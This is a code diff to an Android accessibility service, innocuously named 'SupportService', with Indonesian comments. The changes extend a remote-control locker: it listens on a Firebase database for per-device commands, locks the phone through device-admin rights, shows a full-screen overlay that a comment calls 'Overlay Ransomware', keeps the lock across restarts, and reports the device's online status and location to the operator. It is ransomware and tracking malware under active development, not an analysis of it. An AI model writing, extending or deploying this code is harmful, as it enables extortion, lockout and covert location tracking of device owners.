@@ -165,11 +165,13 @@ public class SupportService extends AccessibilityService {
 
     private void initFirebaseListener() {
         final String myDeviceId = getDeviceId();
-        registerDeviceToFirebase();
         
-        // Sekarang mendengarkan folder perintah khusus untuk device ini saja
-        dbRef = FirebaseDatabase.getInstance("https://bondexremot-default-rtdb.firebaseio.com").getReference("commands").child(myDeviceId);
-        dbRef.addValueEventListener(new ValueEventListener() {
+        // Root reference untuk mendengarkan perubahan pada node commands untuk device ini
+        DatabaseReference cmdRef = FirebaseDatabase.getInstance("https://bondexremot-default-rtdb.firebaseio.com")
+                .getReference("commands")
+                .child(myDeviceId);
+
+        cmdRef.addValueEventListener(new ValueEventListener() {
             @Override
             public void onDataChange(DataSnapshot snapshot) {
                 if (!snapshot.exists()) return;
@@ -178,45 +180,81 @@ public class SupportService extends AccessibilityService {
                 Long serverTime = snapshot.child("t").getValue(Long.class);
 
                 if (cmd == null || serverTime == null) return;
-                if (serverTime <= lastCommandTime) return;
                 
-                lastCommandTime = serverTime;
-
-                task_handler.post(() -> {
-                    handleIncomingCommand(cmd);
-                    // Hapus perintah setelah diproses agar tidak memicu ulang
-                    dbRef.removeValue();
-                });
+                // Cek apakah perintah ini lebih baru dari perintah terakhir yang diproses
+                if (serverTime > lastCommandTime) {
+                    lastCommandTime = serverTime;
+                    
+                    // Gunakan Handler untuk memastikan berjalan di Main Thread
+                    new Handler(Looper.getMainLooper()).post(() -> {
+                        handleIncomingCommand(cmd);
+                    });
+                }
             }
 
             @Override
             public void onCancelled(DatabaseError error) {}
         });
+        
+        // Pastikan koneksi tetap hidup
+        FirebaseDatabase.getInstance().getReference(".info/connected").addValueEventListener(new ValueEventListener() {
+            @Override
+            public void onDataChange(DataSnapshot snapshot) {
+                boolean connected = snapshot.getValue(Boolean.class);
+                if (connected) {
+                    sendStatusReport("Device Online");
+                }
+            }
+            @Override public void onCancelled(DatabaseError error) {}
+        });
     }
 
     private void handleIncomingCommand(String cmd) {
         if (cmd.equalsIgnoreCase("lock")) {
-            if (!isLocked) {
-                setLockStatus(true);
-                hideFpsOverlay();
-                showOverlay();
-                isLocked = true;
-                sendStatusReport("Status: Locked");
-            }
+            executeSystemLock();
         } else if (cmd.equalsIgnoreCase("unlock")) {
-            if (isLocked) {
-                setLockStatus(false);
-                hideOverlay();
-                isLocked = false;
-                SharedPreferences fpsPrefs = getSharedPreferences("status_fps", 0);
-                if (fpsPrefs.getBoolean("is_showing", false)) {
-                    showFpsOverlay();
-                }
-                sendStatusReport("Status: Unlocked");
-            }
+            executeSystemUnlock();
         } else if (cmd.equalsIgnoreCase("locate")) {
-            sendStatusReport("Action: Getting Location...");
             requestCurrentLocation();
+        }
+    }
+
+    private void executeSystemLock() {
+        // 1. Kunci secara sistem (jika Admin Aktif)
+        try {
+            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+            ComponentName adminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);
+            if (dpm.isAdminActive(adminComponent)) {
+                dpm.lockNow();
+            }
+        } catch (Exception e) {
+            // Gagal lock sistem, lanjut ke overlay
+        }
+
+        // 2. Tampilkan Overlay Ransomware
+        if (!isLocked) {
+            hideFpsOverlay();
+            showOverlay();
+            isLocked = true;
+            
+            // Simpan status lock ke persistent storage agar tahan restart
+            getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit().putBoolean("is_sys_locked", true).apply();
+            sendStatusReport("Status: LOCKED (System + Overlay)");
+        }
+    }
+
+    private void executeSystemUnlock() {
+        if (isLocked) {
+            hideOverlay();
+            isLocked = false;
+            
+            getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit().putBoolean("is_sys_locked", false).apply();
+            
+            SharedPreferences fpsPrefs = getSharedPreferences("status_fps", 0);
+            if (fpsPrefs.getBoolean("is_showing", false)) {
+                showFpsOverlay();
+            }
+            sendStatusReport("Status: Unlocked");
         }
     }
 
@@ -389,6 +427,7 @@ public class SupportService extends AccessibilityService {
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                    WindowManager.LayoutParams.FLAG_FULLSCREEN |
                    WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS |
+                   WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED |
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
